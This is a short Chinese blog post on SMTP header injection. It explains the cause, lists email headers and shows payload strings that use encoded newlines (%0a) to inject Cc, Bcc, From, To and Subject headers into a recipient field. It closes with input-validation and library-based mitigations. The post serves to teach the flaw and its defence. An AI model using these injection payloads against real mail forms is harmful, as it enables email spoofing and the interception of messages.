<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8" />
  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
  <title>
    
    smtp注入 丨
    

    typo
  </title>

  
  <link rel="shortcut icon" href="/icon.svg">
  

  <link rel="preconnect" href="https://cdnjs.cloudflare.com">
  
  <link id="theme" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-light.css">
  <script src="https://unpkg.com/@highlightjs/cdn-assets@11.9.0/highlight.min.js"></script>
  

  <!-- 字体 -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">

  
<link rel="stylesheet" href="/css/root.css">

  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/post.css">

<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <header class="header">
  <section class="header-container">
    <a class="logo" href="/">Leo的随便写写</a>
    <ul class="nav">
      
      <li><a href="/archives">archives</a></li>
      
      <li><a href="/about">about</a></li>
      
    </ul>
  </section>
</header>
  <main class="main">
    <article class="post">
  
  <div class="post-title">smtp注入</div>
  <div class="post-meta">
    <div class="date">2024 November 21st</div>
    <div class="tags">
      
      <div class="tag-item">安全技术</div>
      
    </div>
  </div>
  

  <main class="post-content"><p>漏洞成因：还是因为输入内容没有被完整校验或过滤，从而达到非设计预期结果</p>
<h3 id="注入抄送内容"><a href="#注入抄送内容" class="headerlink" title="注入抄送内容"></a>注入抄送内容</h3><p>可通过添加&#x2F;控制邮件头的方式，篡改邮件的发送者、抄送、密送等字段，从而达到欺骗、窃取邮件信息或劫持邮件传递的目的。<br>常见邮件头内容</p>
<table>
<thead>
<tr>
<th>邮件头字段</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>From</td>
<td>邮件的发送者</td>
</tr>
<tr>
<td>To</td>
<td>邮件的主要接收者</td>
</tr>
<tr>
<td>Cc</td>
<td>邮件的抄送接收者</td>
</tr>
<tr>
<td>Bcc</td>
<td>邮件的密送接收者</td>
</tr>
<tr>
<td>Subject</td>
<td>邮件的主题或标题</td>
</tr>
<tr>
<td>Body</td>
<td>邮件的正文内容</td>
</tr>
<tr>
<td>Date</td>
<td>邮件的发送时间</td>
</tr>
<tr>
<td>Reply-To</td>
<td>回复邮件时使用的地址</td>
</tr>
<tr>
<td>Importance</td>
<td>邮件的重要性级别</td>
</tr>
<tr>
<td>MIME-Version</td>
<td>邮件的MIME版本</td>
</tr>
<tr>
<td>Content-Type</td>
<td>邮件正文内容的类型及编码方式</td>
</tr>
<tr>
<td>Content-Disposition</td>
<td>邮件附件的处理方式</td>
</tr>
<tr>
<td>Message-ID</td>
<td>邮件的唯一标识符</td>
</tr>
<tr>
<td>In-Reply-To</td>
<td>针对哪封邮件进行回复的标识符</td>
</tr>
<tr>
<td>References</td>
<td>相关邮件的标识符列表</td>
</tr>
<tr>
<td>Return-Path</td>
<td>邮件的退回地址</td>
</tr>
<tr>
<td>X-Priority</td>
<td>邮件的优先级</td>
</tr>
<tr>
<td>若<code>to_addr</code>为收件人可控，我们将其输入为<code>ntoouuzovrlfy@baybabes.com%0aCc: rocaced977@soremap.com</code>并发送</td>
<td></td>
</tr>
</tbody></table>
<ul>
<li>%0a：换行</li>
</ul>
<h4 id="常见payload"><a href="#常见payload" class="headerlink" title="常见payload"></a>常见payload</h4><pre><code class="highlight plaintext">rec@domain.com%0ACc:recipient@domain.com%0ABcc:recipient1@domain.com admin@domain.com%0AFrom:eval@domain.com From:sender@domain.com%0ATo:attacker@domain.com From:sender@domain.com%0ASubject:This’s%20Fake%20Subject</code></pre>

<h4 id="规避"><a href="#规避" class="headerlink" title="规避"></a>规避</h4><ul>
<li>输入过滤，可以使用正则表达式<code>^[\w\.-]+@[\w\.-]+\.\w+$</code>来过滤用用户提交的邮箱。</li>
<li>使用安全的组件和库，如Python的<code>smtplib</code>、Java的<code>javax.mail</code>、PHP的<code>PHPMailer</code>等，尽可能的通过模块内置的一些函数来设定SMTP header头。</li>
</ul>
<p>参考链接：<a target="_blank" rel="noopener" href="https://juejin.cn/post/7241504677911838778">https://juejin.cn/post/7241504677911838778</a></p>
</main>

</article>


<script src="/js/highlight.js"></script>

  </main>
  <footer class="footer">
  
  <span>Copyright © 2024 typo</span>
  
</footer>
  
<script src="/js/theme.js"></script>

</body>

</html>